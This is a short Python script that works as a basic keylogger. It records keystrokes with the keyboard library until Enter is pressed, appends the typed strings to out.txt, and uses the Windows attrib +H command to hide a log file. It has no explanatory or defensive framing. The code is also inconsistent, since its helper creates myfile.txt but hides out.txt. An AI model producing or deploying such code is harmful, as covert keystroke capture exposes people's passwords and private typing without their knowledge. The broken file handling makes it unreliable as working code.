import keyboard
import subprocess

def create_file():
    f = open("myfile.txt", "x")
    subprocess.check_call(["attrib","+H","out.txt"])
    f.close()

try:
    recorded_keys = keyboard.record('Enter')
    string_ver = keyboard.get_typed_strings(recorded_keys)
    f = open("./out.txt", "a")
    for i in string_ver:
        f.write(i)
    f.close()

except IOError:
    create_file()